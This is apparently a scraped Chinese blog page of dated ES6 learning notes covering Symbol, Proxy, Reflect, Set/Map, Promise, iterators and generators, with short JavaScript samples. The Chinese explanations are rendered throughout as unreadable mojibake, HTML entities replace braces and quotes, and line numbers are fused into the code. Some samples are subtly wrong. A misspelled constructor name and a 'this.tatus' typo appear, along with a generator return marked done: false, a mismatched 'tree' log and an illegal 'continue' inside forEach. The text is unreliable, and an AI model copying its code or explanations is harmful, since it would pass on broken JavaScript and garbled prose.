ev.clientX, y: ev.clientY &#125;); break; case &quot;mouseup&quot;: case &quot;mouseout&quot;: // è§¦å‘è‡ªå®šä¹‰äº‹ä»¶ dragdrop.fire(&#123; type: &quot;dragend&quot;, target: draging, x: ev.clientX, y: ev.clientY &#125;); draging = null; break; &#125; ev.stopPropagation(); &#125; // å•ä¾‹æä¾›å‡ºåŽ»çš„å…¬å…±æŽ¥å£ dragdrop.enable = function () &#123; target.addEventListener(&quot;mousedown&quot;, handleEvent, false); target.addEventListener(&quot;mousemove&quot;, handleEvent, false); target.addEventListener(&quot;mouseup&quot;, handleEvent), false; target.addEventListener(&quot;mouseout&quot;, handleEvent), false; &#125;; dragdrop.disable = function () &#123; target.removeEventListener(&quot;mousedown&quot;, handleEvent); target.removeEventListener(&quot;mousemove&quot;, handleEvent); target.removeEventListener(&quot;mouseup&quot;, handleEvent); &#125; return dragdrop;&#125;;var dg = DragDrop(&quot;#drag&quot;);dg.addHandler(&quot;drag&quot;, function(ev) &#123; console.log(ev.x);&#125;);dg.enable(); â€”â€” 2017/12/14 ES6 ä¹‹ SymbolSymbol æ˜¯ ES6 ä¸­å¼•å…¥çš„ä¸€ä¸ªç¬¬ä¸ƒç§æ•°æ®ç±»åž‹ï¼ˆå‰å…­ç§åˆ†åˆ«æ˜¯ undefinedã€nullã€Booleanã€Stringã€Numberã€Objectï¼‰ã€‚ç›®çš„æ˜¯ä½¿å¾—å±žäºŽ Symbol ç±»åž‹çš„å±žæ€§éƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œå¯ä»¥ä¿è¯ä¸ä¸Žå…¶ä»–å±žæ€§åäº§ç”Ÿå†²çªã€‚ Symbol å‡½æ•°ç›¸åŒå…¥å‚ï¼Œè¿”å›žå€¼ä¸ç›¸ç­‰ 123let sym1 = Symbol('my symbol')let sym2 = Symbol('my symbol')console.log(sym1 == sym2) // false Symbol å€¼ä¸èƒ½å’Œå…¶ä»–ç±»åž‹çš„å€¼è¿›è¡Œè¿ç®—ï¼ŒåŒ…æ‹¬è‡ªèº«ã€‚ä½†æ˜¯å¯ä»¥æ˜¾ç¤ºè½¬åŒ–æˆå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥è½¬åŒ–æˆå¸ƒå°”å€¼ 1234let sym = Symbol('my symbol')console.log(Boolean(sym))console.log(sym.toString()) // Symbol(my symbol)console.log(sym + '.gif') // Uncaught TypeError Symbol å€¼ä½œä¸ºå¯¹è±¡å±žæ€§ 1234567891011121314let mySymbol = Symbol()let a = &#123;&#125;a[mySymbol] = 'Hello'console.log('a:', a)let b = &#123; [mySymbol]: 'Hello'&#125;console.log('b:', b)let c = &#123;&#125;Object.defineProperty(c, mySymbol, &#123; value: 'Hello' &#125;)console.log('c:', c) èŽ·å–å¯¹è±¡æ‰€æœ‰ Symbol å±žæ€§å 12345678910111213const obj = &#123;&#125;let a = Symbol('a')let b = Symbol('b')obj[a] = 'Hello'obj[b] = 'World'const objSymbols = Object.getOwnPropertySymbols(obj)console.log('Object.getOwnPropertySymbols(obj):', Object.getOwnPropertySymbols(obj)) // [Symbol(a), Symbol(b)]console.log('Object.getOwnPropertyNames(obj):', Object.getOwnPropertyNames(obj)) // []console.log('Reflect.ownKeys(obj):', Reflect.ownKeys(obj)) // [Symbol(a), Symbol(b)] Symbol.for() æœç´¢è¿”å›žå·²æœ‰å‚æ•°åç§°çš„ Symbol å€¼ï¼Œæ²¡æœ‰åˆ™ä¼šæ–°å»ºä»¥æ”¹å­—ç¬¦ä¸²ä¸ºåç§°çš„ Symbol å€¼ 123456let s1 = Symbol.for('foo')let s2 = Symbol.for('foo')console.log('symbol for s1 == s2:', s1 === s2)// Symbol.keyFor è¿”å›žå·²ç™»è®°Symbolç±»åž‹å€¼çš„keyconsole.log(Symbol.keyFor(s1)) // fooconsole.log(Symbol.keyFor(Symbol('aaa'))) // undefined Symbol.for ç™»è®°çš„åå­—æ˜¯å…¨å±€çŽ¯å¢ƒçš„ 123456let iframe = document.createElement('iframe')iframe.src = location.hrefdocument.body.appendChild(iframe)console.log(iframe.contentWindow.Symbol.for('foo') === window.Symbol.for('foo')) // true ES6 ä¹‹ ProxyProxy å±žäºŽä¸€ç§â€œå…ƒç¼–ç¨‹â€ï¼Œå³å¯¹ç¼–ç¨‹è¯­è¨€è¿›è¡Œç¼–ç¨‹ã€‚å¯ä»¥ç†è§£æˆåœ¨æœ¨åŒ¾å¯¹è±¡ä¹‹å‰æž¶è®¾ä¸€å±‚â€œæ‹¦æˆªâ€ 1234567891011let proxy = new Proxy( &#123;&#125;, &#123; get: function (target, property) &#123; return 'wuwh' &#125; &#125;)console.log(proxy.time) // wuwhconsole.log(proxy.name) // wuwh Proxy å®žä¾‹å¯ä»¥ä½œä¸ºå…¶ä»–å¯¹è±¡çš„åŽŸåž‹å¯¹è±¡ 1234567891011let proxy = new Proxy( &#123;&#125;, &#123; get: function (target, property) &#123; return 'wuwh' &#125; &#125;)let obj = Object.create(proxy)console.log(proxy.time) Proxy çš„ä¸€äº›å®žä¾‹æ–¹æ³• 123456789101112131415161718192021222324let handler = &#123; get: function (target, name) &#123; if (name === 'prototype') &#123; return Object.prototype &#125; return 'Hello, ' + name &#125;, apply: function (target, thisBinding, args) &#123; return args[0] &#125;, construct: function (target, args) &#123; return &#123; value: args[1] &#125; &#125;&#125;var fproxy = new Proxy(function (x, y) &#123; return x + y&#125;, handler)console.log(fproxy(1, 2)) // 1 è¢«applyæ‹¦æˆªconsole.log(new fproxy(1, 2)) // &#123;value: 2&#125; è¢«constructæ‹¦æˆªconsole.log(fproxy.time) // Hello, time è¢«getæ‹¦æˆª writable å’Œ configurable å±žæ€§éƒ½ä¸º false æ—¶ï¼Œåˆ™è¯¥å±žæ€§ä¸èƒ½è¢«ä»£ç†ï¼Œé€šè¿‡ Proxy å¯¹è±¡è®¿é—®è¯¥å±žæ€§ä¼šæŠ¥é”™ 12345678910111213141516let obj = &#123;&#125;Object.defineProperty(obj, 'foo', &#123; value: 123, writable: false, configurable: false&#125;)const handler = &#123; get: function (target, propKey) &#123; return 'wuwh' &#125;&#125;const proxy = new Proxy(obj, handler)console.log(proxy.foo) â€”â€” 2017/12/15 ES6 ä¹‹ ReflectReflect å¯¹è±¡ä¸Ž Proxy å¯¹è±¡ä¸€æ ·ï¼Œä¹Ÿæ˜¯ ES6 ä¸ºäº†æ“ä½œå¯¹è±¡æä¾›çš„æ–° APIã€‚ Reflect å¯¹è±¡ä¸€å…±æœ‰ 13 ä¸ªé™æ€æ–¹æ³•ã€‚ Reflect.apply(target, thisArg, args) Reflect.construct(target, args) Reflect.get(target, name, receiver) Reflect.set(target, name, value, receiver) Reflect.defineProperty(target, name, desc) Reflect.deleteProperty(target, name) Reflect.has(target, name) Reflect.ownKeys(target) Reflect.isExtensible(target) Reflect.preventExtensions(target) Reflect.getOwnPropertyDescriptor(target, name) Reflect.getPrototypeOf(target) Reflect.setPrototypeOf(target, prototype) Reflect.get &amp;&amp; Reflect.set åœ¨ name å±žæ€§éƒ¨ç½²äº†è¯»å–å‡½æ•°ï¼ˆgetterï¼‰æˆ–è€…æ˜¯è®¾ç½®å‡½æ•°ï¼ˆsetterï¼‰ï¼Œthis ç»‘å®š receiver 1234567891011121314var obj = &#123; foo: 1, set bar(value) &#123; return (this.foo = value) &#125;&#125;var receiveObj = &#123; foo: 5&#125;Reflect.set(obj, 'bar', 3, receiveObj)console.log('obj.bar:', obj.foo)console.log('receiveObj.bar:', receiveObj.foo) å¦‚æžœ Proxy å¯¹è±¡å’Œ Reflect å¯¹è±¡è”åˆä½¿ç”¨ï¼Œå‰è€…æ‹¦æˆªèµ‹å€¼æ“ä½œï¼ŒåŽè€…å®Œæˆèµ‹å€¼çš„é»˜è®¤è¡Œä¸ºï¼Œè€Œä¸”ä¼ å…¥ receiverï¼Œé‚£ä¹ˆ Reflect.set ä¼šè§¦å‘ Proxy.defineProperty 12345678910111213141516var obj = &#123; name: 'wuwh'&#125;var loggedObj = new Proxy(obj, &#123; set: function (target, key, value, receiver) &#123; console.log('set...') Reflect.set(target, key, value, receiver) &#125;, defineProperty(target, key, attribute) &#123; console.log('defineProperty...') Reflect.defineProperty(target, key, attribute) &#125;&#125;)loggedObj.name = 'xiaohua' // set... defineProperty... Reflect.constructor(target, args) 123456789function Geeting(name) &#123; this.name = name&#125;// new çš„å†™æ³•const instance = new Greeting('å¼ ä¸‰')// Reflect.constructçš„å†™æ³•const instance = Reflect.construct(Greeting, ['å¼ ä¸‰']) Reflect.getPrototypeOf(obj) &amp;&amp; Reflect.setPrototypeOf(obj, newProto) è®¾ç½®å’Œè¯»å–å¯¹è±¡çš„protoå±žæ€§ 12345678910function FancyThing() &#123;&#125;const myObj = new FancyThing()const obj = &#123; constructor: FancyThing, name: 'wuwh'&#125;Reflect.setPrototypeOf(myObj, obj)console.log(Reflect.getPrototypeOf(myObj)) // obj Reflect.ownKeys 123456789101112var obj = &#123; foo: 1, bar: 2, [Symbol.for('foo')]: 3, [Symbol.for('baz')]: 4&#125;console.log(Object.getOwnPropertyNames(obj)) // ["foo", "bar"]console.log(Object.getOwnPropertySymbols(obj)) // [Symbol(foo), Symbol(baz)]console.log(Reflect.ownKeys(obj)) // ["foo", "bar", Symbol(foo), Symbol(baz)] ES6 ä¹‹ Set å’Œ Mapset Set æ˜¯ ES6 æ–°æ•°æ®ç»“æž„ï¼Œç±»ä¼¼äºŽæ•°ç»„ï¼Œä½†æ˜¯æˆå‘˜éƒ½æ˜¯å”¯ä¸€çš„ï¼Œæ²¡æœ‰é‡å¤çš„å€¼ 12345678var s = new Set();[1, 2, 3, 4, 5, 1, 2, 3].forEach(function (x) &#123; return s.add(x)&#125;)for (let i of s) &#123; console.log('set i:', i)&#125; å¯ä»¥çœ‹æˆæ˜¯ä¸€ç§æ•°ç»„çš„åŽ»é‡æ–¹æ³• å˜é‡è§£æž„ 123456const set = new Set([1, 2, 3, 4, 1, 2, 3]);console.log([...set]); *//* // åœ¨Setå†…éƒ¨ï¼Œä¸¤ä¸ªNaNæ˜¯ç›¸ç­‰çš„let set = new Set([NaN, NaN]);console.log(set); //Set &#123;NaN&#125; ä¸¤ä¸ªå¯¹è±¡è¢«è§†ä¸ºä¸ç›¸ç­‰ 12let set1 = new Set([&#123;&#125;, &#123;&#125;])console.log(set1) // Set &#123;&#123;&#125;, &#123;&#125;&#125; Set çš„æ–¹æ³• addã€deleteã€clear å’Œ has 123456789101112let s = new Set([0, 1])s.add(2).add(3)console.log(s) // Set &#123;0, 1, 2, 3&#125;console.log(s.has(3)) // trues.delete(2)console.log(s) // Set &#123;0, 1, 3&#125;s.clear()console.log(s) // Set(0) &#123;&#125; å¯ä»¥çœ‹æˆæ˜¯ä¸€ç§æ•°ç»„çš„åŽ»é‡æ–¹æ³• Array.from 12const set = new Set([1, 2, 3, 4, 1, 2, 3])console.log(Array.from(set)) å®žçŽ°å¹¶é›†ï¼Œäº¤é›†å’Œå·®é›† 1234567891011let a = new Set([1, 2, 3])let b = new Set([4, 3, 2])let union = new Set([...a, ...b])console.log(union) // Set(4) &#123;1, 2, 3, 4&#125;let intersect = new Set([...a].filter((x) =&gt; b.has(x)))console.log(intersect) // Set(2) &#123;2, 3&#125;let difference = new Set([...a].filter((x) =&gt; !b.has(x)))console.log(difference) // Set(1) &#123;1&#125; 123456// åžƒåœ¾å›žæ”¶æœºåˆ¶ä¾èµ–å¼•ç”¨è®¡æ•°ï¼Œå¦‚æžœä¸€ä¸ªå€¼çš„å¼•ç”¨æ¬¡æ•°ä¸ä¸º0ï¼Œåžƒåœ¾å›žæ”¶æœºåˆ¶å°±ä¸ä¼šé‡Šæ”¾è¿™å—å†…å­˜ã€‚// ç»“æŸä½¿ç”¨è¯¥å€¼ä¹‹åŽï¼Œæœ‰æ—¶ä¼šå¿˜è®°å–æ¶ˆå¼•ç”¨ï¼Œå¯¼è‡´å†…å­˜æ— æ³•é‡Šæ”¾ï¼Œè¿›è€Œå¯èƒ½ä¼šå¼•å‘å†…å­˜æ³„æ¼ã€‚// WeakSet ä¸­çš„å¯¹è±¡éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œå³åžƒåœ¾å›žæ”¶æœºåˆ¶ä¸è€ƒè™‘ WeakSet å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨// WeakSetæˆå‘˜ç±»åž‹åªèƒ½æ˜¯å¯¹è±¡ç±»åž‹let ws = new WeakSet([1, 2]) // Uncaught TypeError: Invalid value used in weak setconsole.log(ws) Map æ•°æ®ç»“æž„ç±»ä¼¼å¯¹è±¡ï¼Œä¹Ÿæ˜¯é”®å€¼å¯¹çš„é›†åˆï¼Œä½†æ˜¯â€œé”®â€çš„èŒƒå›´ä¸é™äºŽå­—ç¬¦ä¸²ï¼Œå„ç§ç±»åž‹çš„å€¼éƒ½å¯ä»¥ 1234567891011let m = new Map()let o = &#123; msg: 'hello' &#125;m.set(o, 'world')console.log(m) // Map(1) &#123;&#123;â€¦&#125; =&gt; "world"&#125;console.log(m.get(o)) // worldconsole.log(m.has(o)) // trueconsole.log(m.delete(o)) // trueconsole.log(m.has(o)) // false Map å¯ä»¥æŽ¥æ”¶ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œæ•°ç»„æˆå‘˜æ˜¯ä¸€ä¸ªä¸ªè¡¨ç¤ºé”®å€¼å¯¹çš„æ•°ç»„ 12345678let m = new Map([ ['name', 'wuwh'], ['age', 22]])console.log(m) // Map(2) &#123;"name" =&gt; "wuwh", "age" =&gt; 22&#125;console.log(m.size) // 2console.log(m.get('name')) // wuwh äº‹å®žä¸Šä¸ä»…ä»…æ˜¯æ•°ç»„ï¼Œä»»ä½•å…·æœ‰ Iterator æŽ¥å£ã€ æ¯ä¸ªæˆå‘˜éƒ½æ˜¯ä¸€ä¸ªåŒå…ƒç´ çš„æ•°ç»„ï¼Œéƒ½å¯ä»¥å½“ä½œ Map æž„é€ å‡½æ•°çš„å‚æ•° 123456789let set = new Set([ ['foo', 1], ['bar', 2]])console.log(set) // Set(2) &#123;Array(2), Array(2)&#125;let m = new Map(set)console.log(m) // Map(2) &#123;"foo" =&gt; 1, "bar" =&gt; 2&#125; ä¸€ä¸ªé”®å€¼å¤šæ¬¡èµ‹å€¼ï¼ŒåŽé¢çš„ä¼šè¦†ç›–å‰é¢çš„ 123let m = new Map()m.set(1, 'aaa').set(1, 'bbb')console.log(m) // Map(1) &#123;1 =&gt; "bbb"&#125; Map çš„é”®å®žé™…ä¸Šæ˜¯è·Ÿå†…å­˜åœ°å€ç»‘å®šçš„ï¼Œåªè¦å†…å­˜åœ°å€ä¸ä¸€æ ·ï¼Œå°±è§†ä¸ºä¸¤ä¸ªé”® 1234let m = new Map()m.set(['a'], 1)console.log(m.get(['a'])) // undefined forEach æ–¹æ³•æŽ¥å—ç¬¬äºŒä¸ªå‚æ•°ï¼Œç”¨æ¥ç»‘å®š this 123456789let reporter = &#123; report: function (key, value) &#123; console.log(key, value) &#125;&#125;m.forEach(function (value, key, map) &#123; this.report(key, value)&#125;, reporter) â€”â€” 2017/12/18 ES6 ä¹‹ Promiseä»Šå¤©å¤ä¹ ä¸€ä¸‹ ES6 ä¸­ Promise çš„åŸºç¡€ç”¨æ³•ã€‚ES6 è§„å®šï¼ŒPromise å¯¹è±¡æ˜¯ä¸€ä¸ªæž„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆ Promise å®žä¾‹ã€‚Promise å¯¹è±¡æœ‰ä¸¤ä¸ªç‰¹ç‚¹ï¼š å¯¹è±¡çš„çŠ¶æ€ä¸å—å¤–ç•Œå½±å“ï¼› ä¸€æ—¦çŠ¶æ€æ”¹å˜ï¼Œå°±ä¸ä¼šå†å˜ï¼Œä»»ä½•æ—¶å€™éƒ½å¯ä»¥å¾—åˆ°è¿™ä¸ªç»“æžœï¼› ä¼˜ç‚¹ï¼š å°±å¯ä»¥å°†å¼‚æ­¥æ“ä½œä»¥åŒæ­¥æ“ä½œçš„æµç¨‹è¡¨è¾¾å‡ºæ¥ï¼Œé¿å…äº†å±‚å±‚åµŒå¥—çš„å›žè°ƒå‡½æ•°ã€‚ Promise å¯¹è±¡æä¾›ç»Ÿä¸€çš„æŽ¥å£ï¼Œä½¿å¾—æŽ§åˆ¶å¼‚æ­¥æ“ä½œæ›´åŠ å®¹æ˜“ã€‚ ç¼ºç‚¹ï¼š æ— æ³•å–æ¶ˆ Promiseï¼Œä¸€æ—¦æ–°å»ºå®ƒå°±ä¼šç«‹å³æ‰§è¡Œï¼Œæ— æ³•ä¸­é€”å–æ¶ˆã€‚ å¦‚æžœä¸è®¾ç½®å›žè°ƒå‡½æ•°ï¼ŒPromise å†…éƒ¨æŠ›å‡ºçš„é”™è¯¯ï¼Œä¸ä¼šååº”åˆ°å¤–éƒ¨ã€‚ å½“å¤„äºŽ pending çŠ¶æ€æ—¶ï¼Œæ— æ³•å¾—çŸ¥ç›®å‰è¿›å±•åˆ°å“ªä¸€ä¸ªé˜¶æ®µï¼ˆåˆšåˆšå¼€å§‹è¿˜æ˜¯å³å°†å®Œæˆï¼‰ã€‚ Promise æ–°å»ºåŽç«‹å³æ‰§è¡Œï¼Œæ‰€ä»¥é¦–å…ˆè¾“å‡ºçš„æ˜¯ Promiseã€‚ç„¶åŽï¼Œthen æ–¹æ³•æŒ‡å®šçš„å›žè°ƒå‡½æ•°ï¼Œå°†åœ¨å½“å‰è„šæœ¬æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ‰ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥ resolved æœ€åŽè¾“å‡ºã€‚ 1234567891011121314let promise = new Promise(function (resolve, reject) &#123; console.log('Promise') resolve()&#125;)promise.then(function () &#123; console.log('resolved.')&#125;)console.log('Hi!')// Promise// Hi!// resolved Promise å®žçŽ° ajax 123456789101112131415161718192021const getJSON = function (url) &#123; const promise = new Promise(function (resolve, reject) &#123; const handler = function () &#123; if (this.readyState == 4) &#123; if (this.status == 200) &#123; resolve(this.response) &#125; else &#123; reject(new Error(this.statusText)) &#125; &#125; &#125; const xhr = new XMLHttpRequest() xhr.open('GET', url) xhr.onreadystatechange = handler xhr.responseType = 'json' xhr.send() &#125;) return promise&#125; ç¬¬ä¸€ä¸ªå›žè°ƒå‡½æ•°å®Œæˆä»¥åŽï¼Œ ä¼šå°†è¿”å›žç»“æžœä½œä¸ºå‚æ•°ï¼Œ ä¼ å…¥ç¬¬äºŒä¸ªå›žè°ƒå‡½æ•°ã€‚ 12345678getJSON('js/data.json') .then(function (res) &#123; console.log('then res:', res) return res &#125;) .then(function (res) &#123; console.log('then then res:', res) &#125;) å‰ä¸€ä¸ªå›žè°ƒå‡½æ•°ï¼Œæœ‰å¯èƒ½è¿”å›žçš„è¿˜æ˜¯ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè¿™æ—¶åŽä¸€ä¸ªå›žè°ƒå‡½æ•°ï¼Œå°±ä¼šç­‰å¾…è¯¥ promise å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼Œæ‰ä¼šè¢«è°ƒç”¨ï¼Œå¦åˆ™ä¸ä¼šè¢«è°ƒç”¨ã€‚ 1234567891011getJSON('js/data.json') .then(function (res) &#123; console.log('then res:', res) return getJSON(res.src) &#125;) .then(function (res) &#123; console.log('then then res:', res) &#125;) .catch(function (error) &#123; console.log('error:', error.message) &#125;) resolve è¯­å¥åŽï¼ŒæŠ›å‡ºé”™è¯¯ï¼Œä¸ä¼šè¢«æ•èŽ·ï¼Œç­‰äºŽæ²¡æœ‰æŠ›å‡ºï¼ŒPromise çŠ¶æ€ä¸€æ—¦æ”¹å˜ï¼Œä¸ä¼šå†æ”¹å˜ã€‚ 123456789101112const promise = new Promise(function (resolve, reject) &#123; resolve('ok') throw new Error('wrong')&#125;)promise .then(function (value) &#123; console.log('resolve:', value) // ok &#125;) .catch(function (error) &#123; console.log('reject:', error.message) &#125;) catchã€then ä¸­æŠ›å‡ºçš„é”™è¯¯éƒ½ä¼šä¸€çº§ä¸€çº§å¾€åŽå†’æ³¡ï¼Œç›´åˆ°è¢«åŽé¢çš„ catch æ•èŽ·åˆ°ã€‚ 123456789101112131415161718const promise = function () &#123; return new Promise(function (resolve, reject) &#123; resolve(x + 1) &#125;)&#125;promise() .catch(function (error) &#123; console.error('error:', error.message) // error: x is not defined &#125;) .then(function () &#123; console.log('carry on') // carry on console.log('carry on', y) &#125;) .catch(function (error) &#123; console.error('error:', error.message) // error: y is not defined &#125;) p1 å’Œ p2 éƒ½æ˜¯ Promise çš„å®žä¾‹ï¼Œä½†æ˜¯ p2 çš„ resolve æ–¹æ³•å°† p1 ä½œä¸ºå‚æ•°ï¼Œè¿™æ—¶ p1 çš„çŠ¶æ€å°±ä¼šä¼ é€’ç»™ p2ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œp1 çš„çŠ¶æ€å†³å®šäº† p2 çš„çŠ¶æ€ 123456789101112131415161718192021const p1 = new Promise(function (resolve, reject) &#123; setTimeout(function () &#123; console.log('timeout p1') resolve('p1') &#125;, 3000)&#125;)const p2 = new Promise(function (resolve, reject) &#123; setTimeout(function () &#123; console.log('timeout p2') resolve(p1) &#125;, 1000)&#125;)p2.then(function (res) &#123; console.log('p2 res:', res)&#125;)// timeout p2// timeout p1// p2 res: p1 â€”â€” 2017/12/21 ç«‹å³ resolved çš„ Promise æ˜¯åœ¨æœ¬è½®äº‹ä»¶å¾ªçŽ¯çš„æœ«å°¾æ‰§è¡Œï¼Œæ€»æ˜¯æ™šäºŽæœ¬è½®å¾ªçŽ¯çš„åŒæ­¥ä»»åŠ¡ 12345678new Promise((resolve, reject) =&gt; &#123; resolve(1) console.log('resolve...')&#125;).then((res) =&gt; &#123; console.log(res)&#125;)// resolve...// 1 æ‰€æœ‰ Promise å®žä¾‹çš„çŠ¶æ€éƒ½å˜æˆ fulfilledï¼ŒPromise.all çŠ¶æ€æ‰ä¼šå˜æˆ fulfiledåªè¦æœ‰ä¸€ä¸ªåˆ«è¢« rejectedï¼ŒPromise.all çŠ¶æ€å°±å˜æˆ rejected 123456789101112131415161718192021222324252627let getJSON = function (url) &#123; return new Promise(function (resolve, reject) &#123; function handler() &#123; if (this.readyState == 4) &#123; if (this.status == 200 || this.tatus == 304) &#123; resolve(this.response) &#125; else &#123; reject(this.statusText) &#125; &#125; &#125; let xhr = new XMLHttpRequest() xhr.open('GET', url) xhr.onreadystatechange = handler xhr.responseType = 'json' xhr.send(null) &#125;)&#125;Promise.all([getJSON('data/data1.json'), getJSON('data/data2.json')]) .then(function (res) &#123; console.log('all success:', res) &#125;) .catch(function (error) &#123; console.log('error:', error) &#125;) å…¶ä¸­ä¸€ä¸ªå®žä¾‹çŠ¶æ€çŽ‡å…ˆå‘ç”Ÿæ”¹å˜ï¼ŒPromise.race çš„çŠ¶æ€å°±è·Ÿç€æ”¹å˜ï¼Œè¿™ä¸ªçŽ‡å…ˆæ”¹å˜å®žä¾‹çš„è¿”å›žå€¼ä½œä¸ºå›žè°ƒå…¥å‚ 1234567Promise.race([fetch('data/data1.json'), fetch('data/data2.json')]) .then(function (res) &#123; console.log('all success:', res) &#125;) .catch(function (error) &#123; console.log('error:', error) &#125;) ç«‹å³ resolve å¾— Promise å¯¹è±¡ï¼Œæ˜¯æœ¬è½®â€œäº‹ä»¶å¾ªçŽ¯â€å¾—ç»“æŸæ—¶ï¼Œè€Œä¸æ˜¯ä¸‹ä¸€è½®â€œäº‹ä»¶å¾ªçŽ¯â€çš„å¼€å§‹ 12345678910111213setTimeout(() =&gt; &#123; console.log('tree')&#125;, 0)Promise.resolve().then(function () &#123; console.log('two')&#125;)console.log('one')// one// two// three Promise.reject()æ–¹æ³•çš„å‚æ•°ï¼Œä¼šåŽŸå°ä¸åŠ¨åœ°ä½œä¸º reject çš„ç†ç”±ï¼Œå˜æˆåŽç»­æ–¹æ³•çš„å‚æ•° 123456789const thenable = &#123; then(resolve, reject) &#123; reject('some wrong!') &#125;&#125;Promise.reject(thenable).catch(function (error) &#123; console.log(error === thenable) // true&#125;) æ•èŽ·æœ€åŽæŠ›å‡ºæ¥çš„é”™è¯¯ 1234567Promise.prototype.done = function (fulfiled, rejected) &#123; this.then(fulfiled, rejected).catch(function (error) &#123; console.error(error) &#125;)&#125;Promise.reject().done() â€”â€” 2017/12/22 ES6 ä¹‹ Iterator å’Œ forâ€¦of å¾ªçŽ¯éåŽ†å™¨ï¼ˆIteratorï¼‰å°±æ˜¯è¿™æ ·ä¸€ç§æœºåˆ¶ã€‚å®ƒæ˜¯ä¸€ç§æŽ¥å£ï¼Œä¸ºå„ç§ä¸åŒçš„æ•°æ®ç»“æž„æä¾›ç»Ÿä¸€çš„è®¿é—®æœºåˆ¶ã€‚ä»»ä½•æ•°æ®ç»“æž„åªè¦éƒ¨ç½² Iterator æŽ¥å£ï¼Œå°±å¯ä»¥å®ŒæˆéåŽ†æ“ä½œï¼ˆå³ä¾æ¬¡å¤„ç†è¯¥æ•°æ®ç»“æž„çš„æ‰€æœ‰æˆå‘˜ï¼‰ã€‚ æ¨¡æ‹Ÿ next æ–¹æ³• 1234567891011121314var it = makeIterator(['a', 'b'])it.next() // &#123; value: "a", done: false &#125;it.next() // &#123; value: "b", done: false &#125;it.next() // &#123; value: undefined, done: true &#125;function makeIterator(array) &#123; var nextIndex = 0 return &#123; next: function () &#123; return nextIndex &lt; array.length ? &#123; value: array[nextIndex++], done: false &#125; : &#123; value: undefined, done: true &#125; &#125; &#125;&#125; è§£æž„ã€æ‹“å±•è¿ç®—ç¬¦éƒ½ä¼šé»˜è®¤è°ƒç”¨ iterator æŽ¥å£è¦†ç›–åŽŸç”ŸéåŽ†å™¨ 12345678910111213141516171819let str = new String('hi')console.log([...str]) // ["h", "i"]str[Symbol.iterator] = function () &#123; return &#123; next: function () &#123; if (this.first) &#123; this.first = false return &#123; value: 'wuwh', done: false &#125; &#125; else &#123; return &#123; done: true &#125; &#125; &#125;, first: true &#125;&#125;console.log([...str]) // ["wuwh"] yield*åŽé¢è·Ÿçš„æ˜¯ä¸€ä¸ªå¯éåŽ†çš„ç»“æž„ï¼Œå®ƒä¼šè°ƒç”¨è¯¥ç»“æž„çš„éåŽ†å™¨æŽ¥å£ã€‚ 12345678910111213let generator = function* () &#123; yield 1 yield* [2, 3] yield 4&#125;let iterator = generator()console.log(iterator.next())console.log(iterator.next())console.log(iterator.next())console.log(iterator.next())console.log(iterator.next()) ä¸€ä¸ªæ•°æ®ç»“æž„åªè¦éƒ¨ç½²äº† Symbol.iterator å±žæ€§ï¼Œå°±è¢«è§†ä¸ºå…·æœ‰ iterator æŽ¥å£ï¼Œå°±å¯ä»¥ç”¨forâ€¦of å¾ªçŽ¯éåŽ†å®ƒçš„æˆå‘˜.ä¹Ÿå°±æ˜¯è¯´,forâ€¦of å¾ªçŽ¯å†…éƒ¨è°ƒç”¨çš„æ˜¯æ•°æ®ç»“æž„çš„ Symbol.iterator æ–¹æ³•forâ€¦of å¾ªçŽ¯å¯ä»¥ä½¿ç”¨çš„èŒƒå›´åŒ…æ‹¬æ•°ç»„,Set å’Œ Map ç»“æž„,æŸäº›ç±»åž‹çš„æ•°ç»„çš„å¯¹è±¡(arguments å¯¹è±¡,DOM NodeList å¯¹è±¡)Generator å¯¹è±¡ä»¥åŠå­—ç¬¦ä¸² DOM NodeList å¯¹è±¡éƒ¨ç½²äº† iterator æŽ¥å£ 12345let ps = document.querySelectorAll('p')for (let p of ps) &#123; console.log(p)&#125; forâ€¦of èƒ½æ­£ç¡®è¯†åˆ« 32 ä½ UTF-16 å­—ç¬¦ 123for (let x of 'a\uD83D\uDC0A') &#123; console.log(x)&#125; å¹¶ä¸æ˜¯æ‰€æœ‰ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡éƒ½å…·æœ‰ iterator æŽ¥å£ 1234567891011let arrayLike = &#123; 0: 'a', 1: 'b', length: 2&#125;for (let x of arrayLike) &#123; console.log(x) // Uncaught TypeError: arrayLike[Symbol.iterator] is not a function&#125;console.log(Array.from(arrayLike)) forEach ç¼ºç‚¹:break æˆ– return ä¸å¥æ•ˆ 12345let arr = [1, 2, 3];arr.forEach(function(item) &#123; console.log(item); if(item &gt; 2) continue; // Uncaught SyntaxError: Illegal break statement&#125;); â€”â€” 2017/12/25 ES6 ä¹‹ GeneratorGenerator å‡½æ•°è°ƒç”¨å¹¶ä¸æ‰§è¡Œ,è¿”å›žçš„ä¹Ÿä¸æ˜¯å‡½æ•°è¿è¡Œçš„ç»“æžœ,è€Œæ˜¯ä¸€ä¸ªæŒ‡å‘å†…éƒ¨çŠ¶æ€çš„æŒ‡é’ˆå¯¹è±¡,ä¹Ÿå°±æ˜¯éåŽ†å™¨å¯¹è±¡ã€‚ 123456789101112function* helloWorldGenerator() &#123; yield 'hello' yield 'world' return 'ending'&#125;let hw = helloWorldGenerator()console.log(hw.next()) // &#123;value: "hello", done: false&#125;console.log(hw.next()) // &#123;value: "world", done: false&#125;console.log(hw.next()) // &#123;value: "ending", done: false&#125;console.log(hw.next()) // &#123;value: undefined, done: true&#125; yield è¡¨è¾¾å¼åªèƒ½ç”¨åœ¨ Generator å‡½æ•°é‡Œé¢ï¼Œç”¨åœ¨å…¶ä»–åœ°æ–¹éƒ½ä¼šæŠ¥é”™ yield 